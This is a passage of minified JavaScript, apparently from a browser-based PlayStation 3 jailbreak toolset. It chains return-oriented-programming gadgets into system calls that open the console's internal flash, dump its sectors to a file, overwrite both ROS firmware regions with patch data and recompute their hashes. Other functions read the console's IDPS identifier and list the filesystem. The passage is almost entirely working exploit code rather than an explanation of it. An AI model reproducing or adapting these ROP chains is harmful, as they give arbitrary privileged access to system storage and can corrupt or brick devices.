            this.log[0] += "<br>Storage Object read operation complete", this.sfx[0] = a, this.hash_r0 = o, this.hash_r1 = o + 32;
            var p = e.is_nor(),
                d = p ? 16 : 48,
                s = p ? 7340048 : 7340064;
            Logger.info("ROSHashObject: ROS0 SHA256 Calculation Start Offset: 0x" + (r.data_buffer.offset + d).toString(16)), Logger.info("ROSHashObject: ROS0 SHA256 Hash Offset: 0x" + this.hash_r0.toString(16)), Logger.info("ROSHashObject: ROS1 SHA256 Calculation Start Offset: 0x" + (r.data_buffer.offset + s).toString(16)), Logger.info("ROSHashObject: ROS1 SHA256 Hash Offset: 0x" + this.hash_r1.toString(16)), a = p ? "" : vset_r30_r31() + vset_r30_r31() + vset_r30_r31() + vcall_subByOpd(helper.vshgadgets_box.memset_opd_addr, r.data_buffer.offset + 7340032 + helper.patchfile_size, 0, 32), a += vset_r30_r31() + vset_r30_r31() + vset_r30_r31() + vcall_subByOpd(helper.vshgadgets_box.sdk_C7781115_opd_addr, this.hash_r1, r.data_buffer.offset + s, helper.patchfile_size), this.log[1] += "<br>Calculated ROS 1 Hash", this.sfx[1] = a;
            s = vset_r30_r31() + vset_r30_r31() + vset_r30_r31(), a = p ? "" : s + vcall_subByOpd(helper.vshgadgets_box.memset_opd_addr, r.data_buffer.offset + helper.patchfile_size, 0, 48);
            a += s + vcall_subByOpd(helper.vshgadgets_box.sdk_C7781115_opd_addr, this.hash_r0, r.data_buffer.offset + d, helper.patchfile_size), this.log[2] += "<br>Calculated ROS 0 Hash", this.sfx[2] = a
        } else this.error.msg += "Storage Object cannot open"
    },
    patchObject = function(e, r) {
        if (this.error = {
                code: 0,
                msg: ""
            }, !e || !r) return this.error.code = 2415919098, void(this.error.msg = "patchObject creation failure - bad arguments");
        if (this.error.code = e.open(), 0 === this.error.code) {
            var t = r.sector_count / helper.step_sector / 2,
                s = 2 * t * 8,
                o = r.data_buffer.offset + r.data_buffer.size - 1048576;
            libc.memset(o, 255, s), this.ret = [], this.wlen = [], this.log = [], this.sfp = [];
            for (var l = 0, n = 0, a = "", i = 0; i < 2; i++) {
                l = 0 === i ? r.data_buffer.offset + r.offset_data.ros0 : r.data_buffer.offset + r.offset_data.ros1, n = r.patch_start + i * (r.sector_count / 2), this.log[i] += "Patch Object mt_write - Operation " + i.toString() + " - Number of Sectors: 0x" + (r.sector_count / 2).toString(16) + " - Sector Start: 0x" + n.toString(16), this.wlen[i] = [], this.ret[i] = [];
                for (var p = 0; p < t; p++) this.wlen[i][p] = o, this.ret[i][p] = o + 4, o += 8, a += vsyscall32(helper.sc_ssw, e.device_handle, 0, n, helper.step_sector, l, this.wlen[i][p], 34) + vstore_r3_word(this.ret[i][p]), this.log[i] += "<br>Storage Object write - Current Sector: 0x" + n.toString(16) + "<br>Storage Object write - Current Memory Buffer Offset: 0x" + l.toString(16), l += helper.step_sector * e.sector_size, n += helper.step_sector;
                this.log[i] += "<br>Patch Object mt_write - Operation " + i.toString() + " Completed", this.sfp[i] = a, a = ""
            }
            this.log[1] += "<br>Patch Object Operations complete"
        } else this.error.msg += "Storage Object cannot open"
    },
    dumpObject = function(e, r, t) {
        if (this.error = {
                code: 0,
                msg: ""
            }, !e || !t) return this.error.code = 2415919098, void(this.error.msg = "dumpObject creation failure - bad arguments");
        if (this.error.code = e.open(), 0 === this.error.code)
            if (this.error.code = r.open(helper.fs_flag_create_rw), 0 === this.error.code) {
                t.nsec_iter = t.nsec_iter * e.sector_size <= t.buffer.size ? t.nsec_iter : t.buffer.size / e.sector_size;
                var s = parseInt(t.dump_start) === t.dump_start ? t.dump_start : 0,
                    o = Math.floor(t.sector_count / t.nsec_iter),
                    l = t.sector_count - o * t.nsec_iter,
                    n = Math.floor(t.nsec_iter / helper.step_sector),
                    a = Math.floor(l / helper.step_sector),
                    i = l - a * helper.step_sector,
                    p = t.nsec_iter - n * helper.step_sector;
                if (0 === o) this.error.code = 2415919103, this.error.msg += "Arguments error: obj.sector_count % obj.nsec_iter must be 0 &  obj.sector_count>obj.nsec_iter";
                else {
                    var d = (o + 1) * (n + 1) * 8 + 12 * (o + 1) + 8 * (a + 1),
                        h = t.tls.offset;
                    libc.memset(h, 255, d), this.rret = [], this.rlen = [], this.wret = [], this.wlen = [], this.log = [], this.sfr = [], this.sfw = [];
                    var c = 0 < t.save_offset ? helper.patchfile_size : t.nsec_iter * e.sector_size,
                        d = l * e.sector_size,
                        _ = 0;
                    this.log[0] = "Multithreaded Dump Operations:<br>";
                    for (var f = "", u = 0; u < o; u++) {
                        f = "", _ = t.buffer.offset, this.log[u] = this.log[u] ? this.log[u] + "Dump Object mt_read - Number of Sectors: 0x" + t.nsec_iter.toString(16) : "<br>Dump Object mt_read - Number of Sectors: 0x" + t.nsec_iter.toString(16), this.rret[u] = [], this.rlen[u] = [];
                        for (var g = 0; g < n; g++) this.rret[u][g] = h, this.rlen[u][g] = h + 4, h += 8, f += vsyscall32(helper.sc_ssr, e.device_handle, 0, s, helper.step_sector, _, this.rlen[u][g], 34, 0) + vstore_r3_word(this.rret[u][g]), this.log[u] += "<br>Dump Object mt_read - Current Sector: 0x" + s.toString(16) + "<br>Dump Object mt_read - Current Memory Buffer Offset: 0x" + _.toString32(), s += helper.step_sector, _ += helper.step_sector * e.sector_size;
                        0 < p && (this.rret[u][n] = h, this.rlen[u][n] = h + 4, h += 8, f += vsyscall32(helper.sc_ssr, e.device_handle, 0, s, p, _, this.rlen[u][n], 34, 0) + vstore_r3_word(this.rret[u][n]), this.log[u] += "<br>Dump Object mt_read - Current Sector: 0x" + s.toString(16) + "<br>Dump Object mt_read - Current Memory Buffer Offset: 0x" + _.toString32(), s += p, _ += p * e.sector_size), this.sfr[u] = f, this.log[u] += "<br>Dump Object mt_read operation complete<br>Dump Object mt_save: Save Operations - Data Size 0x" + c.toString(16) + " Buffer offset 0x" + (t.buffer.offset + t.save_offset).toString32() + "<br>Dump Object mt_save: Save Operations - Complete", this.wlen[u] = h, this.wret[u] = h + 8, h += 12, f = vsyscall32(helper.sc_fs_write, r.fd, t.buffer.offset + t.save_offset, c, this.wlen[u]) + vstore_r3_word(this.wret[u]), this.sfw[u] = f
                    }
                    if (0 < l) {
                        for (f = "", _ = t.buffer.offset, this.log[o] = "<br>Dump Object mt_read - Number of Sectors: 0x" + t.nsec_iter.toString(16), this.rret[o] = [], this.rlen[o] = [], g = 0; g < a; g++) this.rret[o][g] = h, this.rlen[o][g] = h + 4, h += 8, f += vsyscall32(helper.sc_ssr, e.device_handle, 0, s, helper.step_sector, _, this.rlen[o][g], 34, 0) + vstore_r3_word(this.rret[o][g]), this.log[o] += "<br>Dump Object mt_read - Current Sector: 0x" + s.toString32() + "<br>Dump Object mt_read - Current Memory Buffer Offset: 0x" + _.toString32(), s += helper.step_sector, _ += helper.step_sector * e.sector_size;
                        0 < i && (this.rret[o][a] = h, this.rlen[o][a] = h + 4, h += 8, f += vsyscall32(helper.sc_ssr, e.device_handle, 0, s, i, _, this.rlen[o][a], 34, 0) + vstore_r3_word(this.rret[o][a]), this.log[o] += "<br>Dump Object mt_read - Current Sector: 0x" + s.toString32() + "<br>Dump Object mt_read - Current Memory Buffer Offset: 0x" + _.toString32(), s += i, _ += i * e.sector_size), this.sfr[o] = f, this.log[o] += "<br>Dump Object mt_read operation complete<br>Dump Object mt_save: Save Operations - Data Size 0x" + c.toString(16) + " Buffer offset 0x" + (t.buffer.offset + t.save_offset).toString32() + "<br>Dump Object mt_save: Save Operations - Complete", this.wlen[o] = h, this.wret[o] = h + 8, h += 12, f = vsyscall32(helper.sc_fs_write, r.fd, t.buffer.offset + t.save_offset, d, this.wlen[o]) + vstore_r3_word(this.wret[o]) + "", this.sfw[o] = f
                    }
                }
            } else this.error.msg += "File Object in mode RW cannot open";
        else this.error.msg += "Storage Object cannot open"
    },
    storageObject = function() {
        this.device_handle = -1, this.current_sector = 0, this.step_sector = helper.step_sector, this.buffer = {
            offset: 0,
            size: 0
        };
        var c = helper.heap.store();
        this.totalsec = 0, this.sector_size = 0;
        var _ = is_norflash();
        this.flash_type = _ ? UInt64("0100000000000004") : UInt64("0100000000000001"), this.is_nor = function() {
            return _
        }, this.open = function() {
            var e = 0;
            if (this.device_handle <= 0) {
                var r = helper.heap.store();
                e = helper.rop.rrun(syscall(helper.sc_sso, this.flash_type, 0, r));
                var t = helper.memory.upeek32(r);
                if (helper.heap.free([r]), 0 !== e || t <= 0) return Logger.error("Storage Object open: failed to open"), this.device_handle = -1, e;
                Logger.info("Storage Object opened"), this.device_handle = t, 0 !== this.totalsec && 0 !== this.sector_size || (Logger.info("Storage Object get_device_info"), t = helper.heap.store(64), e = helper.rop.rrun(syscall(helper.sc_ssgdi, this.flash_type, t)), this.totalsec = helper.memory.upeek32(t + 44), this.sector_size = helper.memory.upeek32(t + 48), Logger.info("Storage Object Sector size: 0x" + this.sector_size.toString(16) + " bytes - Total Number of Sectors: 0x" + this.totalsec.toString(16)), helper.heap.free([t]), 0 !== e && Logger.error("Storage Object get_device_info: failed to get data"))
            }
            return e
        }, this.read = function(e, r, t) {
            var s = "Storage Object read - Number of Sectors: 0x" + e.toString(16),
                o = -1;
            if (0 !== this.open() || this.device_handle <= 0) return Logger.error("Storage Object read aborted"), o;
            this.current_sector = r || this.current_sector;
            for (var l = e < this.step_sector ? e : this.step_sector, n = Math.floor(e / l), r = e - n * l, a = 0, i = 0, i = t ? t.offset : (helper.buffer.free([this.buffer.offset]), this.buffer = helper.buffer.create(e * this.sector_size), this.buffer.offset), p = 0; p < n; p++) o = helper.rop.rrun(syscall32(helper.sc_ssr, this.device_handle, 0, this.current_sector, l, i, c, 34, 0)), s += "<br>Storage Object read - Current Sector: 0x" + this.current_sector.toString(16) + "<br>Storage Object read - Current Memory Buffer Offset: 0x" + i.toString(16), a = helper.memory.upeek32(c), (0 !== o || a < l) && (s += 0 < "<br>Storage Object read error:" + o ? " 0x" + o.toString(16) : " failed to read " + l.toString(16) + " sectors - Number of sectors read: 0x" + a.toString(16)), this.current_sector = this.current_sector + l, i += l * this.sector_size;
            return 0 < r && (o = helper.rop.rrun(syscall32(helper.sc_ssr, this.device_handle, 0, this.current_sector, r, i, c, 34)), s += "<br>Storage Object read - Current Sector: 0x" + this.current_sector.toString(16) + "<br>Storage Object read - Current Memory Buffer Offset: 0x" + i.toString(16), a = helper.memory.upeek32(c), (0 !== o || a < r) && (s += 0 < "<br>Storage Object read error:" + o ? " 0x" + o.toString(16) : " failed to read " + r.toString(16) + " sectors - Number of sectors read: 0x" + a.toString(16)), this.current_sector = this.current_sector + r, i += r * this.sector_size), s += "<br>Storage Object read operation complete", Logger.info(s), o
        }, this.write = function(e, r, t) {
            var s = "Storage Object write - Number of Sectors: 0x" + e.toString(16),
                o = -1;
            if (0 !== this.open() || this.device_handle <= 0) return Logger.error("Storage Object write aborted"), o;
            for (var l = e < this.step_sector ? e : this.step_sector, n = Math.floor(e / l), a = e - n * l, i = 0, p = t || (_ ? helper.start_write_sector_nor : helper.start_write_sector_nand), d = (r || this.buffer).offset, h = 0; h < n; h++) o = helper.rop.rrun(syscall32(helper.sc_ssw, this.device_handle, 0, p + h * l, l, d + h * l * this.sector_size, c, 34)), s += "<br>Storage Object write - Current Sector: 0x" + (p + h * l).toString(16) + "<br>Storage Object write - Current Memory Buffer Offset: 0x" + d.toString(16), i = helper.memory.upeek32(c), 0 === o && i === l || (s += 0 < "<br>Storage Object write error:" + o ? " 0x" + o.toString(16) : " failed to write " + l.toString(16) + " sectors - Number of sectors written: 0x" + i.toString(16)), this.current_sector = this.current_sector + l, d += l * this.sector_size;
            return 0 < a && (o = helper.rop.rrun(syscall32(helper.sc_ssw, this.device_handle, 0, p + e - a, a, d + (e - a) * this.sector_size, c, 34)), s += "<br>Storage Object write - Current Sector: 0x" + (p + e - a).toString(16) + "<br>Storage Object write - Current Memory Buffer Offset: 0x" + d.toString(16), i = helper.memory.upeek32(c), 0 === o && i === a || (s += 0 < "<br>Storage Object write error:" + o ? " 0x" + o.toString(16) : " failed to write " + a.toString(16) + " sectors - Number of sectors written: 0x" + i.toString(16)), 0 === o && i !== a && (o = 2415919103), this.current_sector = this.current_sector + a, d += a * this.sector_size), s += "Storage Object write operation complete", Logger.info(s), o
        }, this.close = function(e) {
            var r = 0;
            return 0 < this.device_handle && (Logger.info("Storage Object close"), 0 !== (r = helper.rop.rrun(syscall32(helper.sc_ssc, this.device_handle))) ? Logger.error("Storage Object close failed") : (this.device_handle = -1, e || helper.buffer.free([this.buffer.offset]), helper.heap.free([c]))), r
        }
    },
    getIDPS = function(e, r) {
        var t = helper.heap.store(512),
            r = e.read(1, r, {
                offset: t,
                size: 512
            });
        0 < r && Logger.error("getIDPS: Storage Object Read Error : 0x" + r.toString(16));
        r = helper.memory.upeeks(t + helper.idps_offset, 16, !1);
        return helper.heap.free([t]), r
    },
    getActiveNandROS = function(e) {
        var r = helper.heap.store(512),
            e = e.read(1, 1024, {
                offset: r,
                size: 512
            });
        0 < e && Logger.error("getActiveNandROS: Storage Object Read Error : 0x" + e.toString(16));
        e = helper.memory.upeeks(r, 16, !1);
        return helper.heap.free([r]), e
    },
    getDirList = function(e) {
        return getFList(e, 1)
    },
    getFileList = function(e) {
        return getFList(e, 2)
    },
    getFItemsList = function(n, e, r) {
        alert("getFList processing start");
        var t = {
            files: [],
            folders: []
        };
        if (!helper.worker.fe && (helper.worker.fe = new workerThread("BGTOOLSET_WKR_FE"), !helper.worker.fe)) return alert("FE Worker Thread Creation failed!"), t;
        helper.fsitems.ret = t, helper.fsitems.op = r, helper.fsitems.dest = e, helper.fsitems.bf = helper.worker.fe.getTLS().offset, alert("BGTOOLSET_WKR_FE created"), helper.memory.upoke32(helper.fsitems.bf, 0), helper.memory.upokes(helper.fsitems.bf + 4, n.ins[0], !0), alert("Queueing opendir"), helper.worker.fe.run(vsyscall32(helper.sc_fs_opendir, helper.fsitems.bf + 4, helper.fsitems.bf), "Scanning Directory " + pp, function() {
            alert("opendir")
        }, function() {
            alert("opendir done"), fd = helper.memory.upeek32(helper.fsitems.bf);
            var e = vsyscall32(helper.sc_fs_readdir, fd, helper.fsitems.bf, helper.fsitems.bf + 260) + vsyscall32(helper.sc_fs_readdir, fd, helper.fsitems.bf + 268, helper.fsitems.bf + 528) + vsyscall32(helper.sc_fs_readdir, fd, helper.fsitems.bf + 536, helper.fsitems.bf + 796) + vsyscall32(helper.sc_fs_readdir, fd, helper.fsitems.bf + 804, helper.fsitems.bf + 1064);
            ! function o(l) {
                libc.memset(helper.fsitems.bf, 0, 1072), helper.worker.fe.run(e, "Scanning Directory Item " + (l.files.length + l.folders.length).toString(), function() {
                    alert("readdir")
                }, function() {
                    for (var e = helper.memory.upeeks(helper.fsitems.bf, 1072), r = 0; r < 4; r++) {
                        var t = 268 * r;
                        if (0 === parseInt(e.substr(2 * (264 + t), 8), 16)) return helper.fsitems.ret = l, void helper.worker.fe.run(vsyscall32(helper.sc_fs_closedir, fd), "Scan Directory Close", function() {
                            alert("closedir")
                        }, function() {
                            jQuery.each(helper.fsitems.ret.files, function(e, r) {}), jQuery.each(helper.fsitems.ret.folders, function(e, r) {
                                n.ins.push(r)
                            }), n.outs.push(n.ins.splice(0, 1)), 0 === n.ins.length || getFItemsList(n, helper.fsitems.dest, helper.fsitems.op)
                        });
                        var s = e.substr(2 * (2 + t), 2 * parseInt(e.substr(2 * (1 + t), 2), 16)).fromAscii();
                        0 !== s.length && "." !== s && ".." !== s && (2 === (t = parseInt(e.substr(2 * t, 2), 16)) ? l.files.push(s) : 1 === t && l.folders.push(s))
                    }
                    o(l)
                })
            }(t)
        })
    },
    getFList = function(e, r) {
        var t, e = helper.heap.store(e, !0),
            s = libc.opendir(e),
            o = [];
        if (0 < s)
            for (; 0 < (t = libc.readdir(s));) {
                var l = helper.memory.upeeks(t + 11, 256, !0);
                helper.swf.leakbyte(t + 10) === r && o.push(l)
            }
        return libc.closedir(s), helper.heap.free([e]), o
    },
    is_node = function(t, e, s, o) {
        var l = !1;
        return $.each(e.children, function(e, r) {
            r = t.get_node(r);
            if (r.type === o && r.text === s) return !(l = !0)
        }), l
    },
    is_treebase = function(e, r) {
        return "string" == typeof e ? "#" === e : "#" === r.instance.get_type(e)
    },
    _is = function(e, t) {
        var s = !1;
        return $.each(e, function(e, r) {
            if ("string" == typeof t) {
                if (t === r) return !(s = !0)
            } else if (t.id === r) return !(s = !0)
        }), s
    },
    is_parent = function(e, r) {
        return _is(r.node.parents, e)
    },
    is_descendant = function(e, r) {
        return _is(r.node.children_d, e)
    },
    is_child = function(e, r) {
        return _is(r.node.children, e)
    },
    is_sibling = function(e, r) {
        return _is(r.instance.get_node(r.node.parent).children, e)
    },
    get_disk_free_size = function(e) {
        var r = helper.heap.store(helper.snull64),
            t = helper.heap.store(helper.snull64),
            s = null,
            o = null,
            l = "string" == typeof e,
            n = l ? helper.heap.store(e, !0) : e,
            e = helper.rop.rrun(syscall32(helper.sc_fs_disk_free, n, r, t));
        return 0 !== e ? Logger.error("get_disk_free_size: sys_fs_disk_free error 0x" + e.toString(16)) : (s = Uint64(helper.memory.upeeks(r, 8)), o = Uint64(helper.memory.upeeks(t, 8))), l ? helper.heap.free([r, t, n]) : helper.heap.free([r, t]), {
            total: s,
            available: o
        }
    },
    cellFsGetFreeSize = function(e) {
        var r = "string" == typeof e,
            t = r ? helper.heap.store(e, !0) : e,
            s = helper.heap.store(helper.snull64),
            o = helper.heap.store(),
            l = null,
            n = null,
            e = helper.rop.rrun(vcall_subByOpd(helper.vshgadgets_box.sys_fs_cellFsGetFreeSize_opd_addr, t, o, s));
        return 0 !== e ? Logger.error("cellFsGetFreeSize: error 0x" + e.toString(16)) : (l = Uint64(helper.memory.upeeks(s, 8)), n = helper.memory.upeek32(o)), r ? helper.heap.free([o, s, t]) : helper.heap.free([o, s]), {
            block_size: n,
            block_num: l
        }
    },
    getMountedPointList = function(e) {
        var r = [],
            t = helper.heap.store(helper.snull64),
            s = helper.rop.rrun(syscall32(helper.sc_fs_get_mount_info_size, t));
        0 !== s && Logger.error("testgetMountedPointList: getMountInfoSize error 0x" + s.toString(16));
        var o = helper.memory.upeek32(t + 4),
            l = helper.heap.store(148 * o),
            n = helper.heap.store(helper.snull64);
        0 !== (s = helper.rop.rrun(syscall32(helper.sc_fs_get_mount_info, l, o, n))) && Logger.error("testgetMountedPointList: getMountInfo error 0x" + s.toString(16));
        for (var a = helper.memory.upeek32(n + 4), i = 1; i < a; i++) {
            var p = helper.memory.upeeks(l + 64 + 148 * i, 32, !0);
            (!e || "CELL_FS_IOS:BUILTIN_FLSH" !== p.substr(0, 24) && 0 === helper.memory.upeek8(l + 147 + 148 * i)) && r.push({
                text: helper.memory.upeeks(l + 148 * i, 32, !0),
                type: "root",
                children: !0
            })
        }
        return helper.heap.free(t, l, n), r
    },
    getJSTreeData = function(e, r, t, s) {
        if ("#" === r.id) return getMountedPointList(s);
        if ("file" === r.type) return [];
        var e = e.get_fullpath(r),
            r = helper.heap.store(e, !0),
            e = helper.heap.store(),
            o = helper.heap.store(260),
            l = helper.heap.store(8),
            n = helper.rop.rrun(syscall32(helper.sc_fs_opendir, r, e)),
            a = helper.memory.upeek32(e),
            i = 0,
            p = [];
        if (0 === n && 0 <= a) {
            for (n = helper.rop.rrun(syscall32(helper.sc_fs_readdir, a, o, l)), i = helper.memory.upeek32(l + 4); 0 === n && 0 !== i;) {
                var d, h = helper.memory.upeeks(o + 2, helper.memory.upeek8(o + 1), !0);
                0 < h.length && "." !== h && ".." !== h && (2 === (d = helper.memory.upeek8(o)) && !0 === t ? p.push({
                    text: h,
                    type: "file"
                }) : 1 === d && p.push({
                    text: h,
                    type: "folder",
                    children: !0
                })), n = helper.rop.rrun(syscall32(helper.sc_fs_readdir, a, o, l)), i = helper.memory.upeek32(l + 4)
            }
            n = helper.rop.rrun(syscall32(helper.sc_fs_closedir, a))
        }
        return 0 < n && Logger.error("getJSTreeData: Error 0x" + n.toString(16)), helper.heap.free([e, r, o, l]), p
    },
    getJSTreeData2 = function(e, r, t, s) {
        if ("#" === r.id) return getMountedPointList(s);
        if ("file" === r.type) return [];
        var o = 0,
            l = 0;
        if (helper.comp.fd < 0) {
            helper.comp.ret = [], helper.comp.node = r, o = 3;
            var n = helper.heap.store(),
                s = helper.heap.store(e.get_fullpath(r), !0),
                l = helper.rop.rrun(syscall32(helper.sc_fs_opendir, s, n));
            return helper.comp.fd = helper.memory.upeek32(n), helper.heap.free([n, s]), setTimeout(function() {
                e.load_node(r)
            }, 1e3), []
        }
        var a = 0,
            i = helper.heap.store(260),
            p = helper.heap.store(8);
        if (0 === l && 0 <= helper.comp.fd) {
            for (var d = o; d < 4; d++) {
                if (l = helper.rop.rrun(syscall32(helper.sc_fs_readdir, helper.comp.fd, i, p)), a = helper.memory.upeek32(p + 4), 0 !== l || 0 === a) {
                    if (0 < l) {
                        Logger.error("getJSTreeData: readdir error 0x" + l.toString(16));
                        break
                    }
                    break
                }
                var h, c = helper.memory.upeeks(i + 2, helper.memory.upeek8(i + 1), !0);
                0 < c.length && "." !== c && ".." !== c && (2 === (h = helper.memory.upeek8(i)) && !0 === t ? helper.comp.ret.push({
                    text: c,
                    type: "file"
                }) : 1 === h && helper.comp.ret.push({
                    text: c,
                    type: "folder",
                    children: !0
                }))
            }
            if (0 !== l || 0 === a) return 0 < l && Logger.error("getJSTreeData: readdir 0x" + l.toString(16)), l = helper.rop.rrun(syscall32(helper.sc_fs_closedir, helper.comp.fd)), helper.comp.fd = -1, 0 < l && Logger.error("getJSTreeData: closedir Error 0x" + l.toString(16)), helper.heap.free([i, p]), 0 === helper.comp.ret.length ? -1 : helper.comp.ret;
            setTimeout(function() {
                e.load_node(r)
            }, 1250)
        } else 0 < l ? Logger.error("getJSTreeData: opendir error 0x" + l.toString(16)) : (Logger.error("getJSTreeData: opendir bad descriptor"), 0 < (l = helper.rop.rrun(syscall32(helper.sc_fs_closedir, helper.comp.fd))) ? Logger.error("getJSTreeData: closedir error 0x" + l.toString(16)) : helper.comp.fd = -1);
        return helper.heap.free([i, p]), []
    },
    getJSTreeData_fast = function(e, r, t, s) {
        if ("#" === r.id) return getMountedPointList(s);
        if ("file" === r.type) return [];
        if (helper.comp.fd < 0) {
            helper.comp.ret = [], 0 < helper.comp.bf && helper.heap.free([helper.comp.bf]), helper.comp.bf = helper.heap.store(1072), helper.comp.node = r;
            var o = helper.heap.store(),
                s = helper.heap.store(e.get_fullpath(r), !0);
            return helper.rop.run(syscall32(helper.sc_fs_opendir, s, o)), helper.comp.fd = helper.memory.upeek32(o), helper.heap.free([o, s]), helper.comp.sfread = syscall32(helper.sc_fs_readdir, helper.comp.fd, helper.comp.bf, helper.comp.bf + 260) + syscall32(helper.sc_fs_readdir, helper.comp.fd, helper.comp.bf + 268, helper.comp.bf + 528) + syscall32(helper.sc_fs_readdir, helper.comp.fd, helper.comp.bf + 536, helper.comp.bf + 796) + syscall32(helper.sc_fs_readdir, helper.comp.fd, helper.comp.bf + 804, helper.comp.bf + 1064), setTimeout(function() {
                e.load_node(r)
            }, 500), []
        }
        if (0 <= helper.comp.fd) {
            helper.rop.run(helper.comp.sfread);
            for (var l = helper.memory.upeeks(helper.comp.bf, 1072), n = 0, a = 0; a < 4; a++) {
                var i = 268 * a;
                if (0 === (n = parseInt(l.substr(2 * (264 + i), 8), 16))) break;
                var p = l.substr(2 * (2 + i), 2 * parseInt(l.substr(2 * (1 + i), 2), 16)).fromAscii();
                0 !== p.length && "." !== p && ".." !== p && (2 === (i = parseInt(l.substr(2 * i, 2), 16)) && !0 === t ? helper.comp.ret.push({
                    text: p,
                    type: "file"
                }) : 1 === i && helper.comp.ret.push({
                    text: p,
                    type: "folder",
                    children: !0
                }))
            }
            if (0 === n) return setTimeout(function() {
                helper.rop.run(syscall32(helper.sc_fs_closedir, helper.comp.fd)), helper.comp.fd = -1, helper.heap.free([helper.comp.bf]), helper.comp.bf = 0, helper.comp.sfread = ""
            }, 500), 0 === helper.comp.ret.length ? -1 : helper.comp.ret;
            setTimeout(function() {
                e.load_node(r)
            }, 500)
        } else Logger.error("getJSTreeData: opendir bad descriptor"), helper.rop.run(syscall32(helper.sc_fs_closedir, helper.comp.fd)), helper.comp.fd = -1, helper.comp.sfread = "";
        return []
    },
    getJSTreeData_wk = function(o, e, l, r) {
        if ("#" === e.id) return getMountedPointList(r);
        if ("file" === e.type) return [];
        if (!0 === helper.comp.done) return helper.comp.done = !1, Logger.debug("getJSTreeData_wk processing done"), 0 === helper.comp.ret.length ? -1 : helper.comp.ret;
        if (helper.comp.fd < 0) {
            if (Logger.debug("getJSTreeData_wk processing start"), !helper.worker.fe && (helper.worker.fe = new workerThread("BGTOOLSET_WKR_FE"), !helper.worker.fe)) return Logger.error("FE Worker Thread Creation failed!"), [];
            helper.comp.bf = helper.worker.fe.getTLS().offset, helper.comp.ret = [], helper.comp.node = e;
            var t = o.get_fullpath(helper.comp.node);
            libc.memset(helper.comp.bf, 0, 1072), helper.memory.upokes(helper.comp.bf + 8, t, !0), helper.worker.fe.run(vsyscall32(helper.sc_fs_opendir, helper.comp.bf + 8, helper.comp.bf), "Scanning Directory " + t, function() {
                Logger.debug("opendir: " + t)
            }, function() {
                helper.comp.fd = helper.memory.upeek32(helper.comp.bf), helper.comp.sfread = vsyscall32(helper.sc_fs_readdir, helper.comp.fd, helper.comp.bf, helper.comp.bf + 260) + vsyscall32(helper.sc_fs_readdir, helper.comp.fd, helper.comp.bf + 268, helper.comp.bf + 528) + vsyscall32(helper.sc_fs_readdir, helper.comp.fd, helper.comp.bf + 536, helper.comp.bf + 796) + vsyscall32(helper.sc_fs_readdir, helper.comp.fd, helper.comp.bf + 804, helper.comp.bf + 1064), o.load_node(helper.comp.node)
            })
        } else helper.worker.fe.run(helper.comp.sfread, "Scanning Directory Item " + helper.comp.ret.length.toString(), function() {
            libc.memset(helper.comp.bf, 0, 1072), Logger.debug("readdir: 0x" + helper.comp.fd.toString(16))
        }, function() {
            for (var e = helper.memory.upeeks(helper.comp.bf, 1072), r = 0; r < 4; r++) {
                var t = 268 * r;
                if (0 === parseInt(e.substr(2 * (264 + t), 8), 16)) {
                    helper.comp.done = !0, helper.worker.fe.run(vsyscall32(helper.sc_fs_closedir, helper.comp.fd), "Scan Directory Close", function() {
                        Logger.debug("closedir 0x" + helper.comp.fd.toString(16))
                    }, function() {
                        helper.comp.fd = -1, o.load_node(helper.comp.node)
                    });
                    break
                }
                var s = e.substr(2 * (2 + t), 2 * parseInt(e.substr(2 * (1 + t), 2), 16)).fromAscii();
                0 !== s.length && "." !== s && ".." !== s && (2 === (t = parseInt(e.substr(2 * t, 2), 16)) && !0 === l ? helper.comp.ret.push({
                    text: s,
                    type: "file"
                }) : 1 === t && helper.comp.ret.push({
                    text: s,
                    type: "folder",
                    children: !0
                })), 3 === r && (libc.memset(helper.comp.bf, 0, 1072), o.load_node(helper.comp.node))
            }
        });
        return []
    };

function scanContext(e, r, t) {
    this.tree_instance = e, this.node = r, this.scan_base = e.get_fullpath(r), this.currentfd = -1, this.sfread = "", this.tls = 0, this.totalSize = UInt64("0"), this.scanQ = new FIFOQ, this.scanQ.add(this.scan_base), this.todoFolderQ = new FIFOQ, this.todoFileQ = new FIFOQ, this.cb = t || null, this.reset = function(e, r, t) {
        this.tree_instance = e, this.node = r, this.scan_base = e.get_fullpath(r), this.currentfd = -1, this.sfread = "", this.tls = 0, this.scanQ = new FIFOQ, this.scanQ.add(this.scan_base), this.todoFolderQ = new FIFOQ, this.todoFileQ = new FIFOQ, this.totalSize = UInt64("0"), this.cb = t || null
    }
}
var getStat = function(e) {
        var r = helper.heap.store(128),
            t = helper.heap.store(e, !0),
            s = helper.rop.rrun(syscall32(helper.sc_fs_stat, t, r)),
            o = helper.memory.upeek32(r + helper.stat_size_offset),
            l = helper.memory.upeeks(r + 32, 8),
            n = helper.memory.upeeks(r + 24, 8);
        return ret = {
            size: o,
            ctime: l,
            mtime: n
        }, helper.heap.free([r, t]), 0 !== s ? (Logger.error("getStat " + e + " error: 0x" + s), -1) : ret
    },
    getMPList = function(e) {
        var r = [],
            t = helper.heap.store(helper.snull64),
            s = helper.rop.rrun(syscall32(helper.sc_fs_get_mount_info_size, t));
        0 !== s && Logger.error("getMPList: getMountInfoSize error 0x" + s.toString(16));
        var o = helper.memory.upeek32(t + 4),
            l = helper.heap.store(148 * o),
            n = helper.heap.store(helper.snull64);
        0 !== (s = helper.rop.rrun(syscall32(helper.sc_fs_get_mount_info, l, o, n))) && Logger.error("getMPList: getMountInfo error 0x" + s.toString(16));
        for (var a = helper.memory.upeek32(n + 4), i = 1; i < a; i++) {
            var p = helper.memory.upeeks(l + 64 + 148 * i, 32, !0),
                p = (!e || "CELL_FS_IOS:BUILTIN_FLSH" !== p.substr(0, 24) && helper.memory.upeek8(l + 147 + 148 * i), helper.memory.upeeks(l + 148 * i, 32, !0));
            r[p + "/"] = {
                Filename: p.substr(1),
                "File Type": "root",
                Preview: "test/images/fileicons/_Favourites.png",
                Path: p + "/",
                Error: 0 !== s ? "Mount info extraction error" : "",
                Code: 0 !== s ? -1 : 0,
                Properties: {
                    "Date Created": null,
                    "Date Modified": null,
                    Width: null,
                    Height: null,
                    Size: null,
                    "Free Size": null
                }
            }
        }
        return helper.heap.free(t, l, n), r
    },
    delete_dir = function() {
        if (helper.sctx && helper.sctx.scanQ)
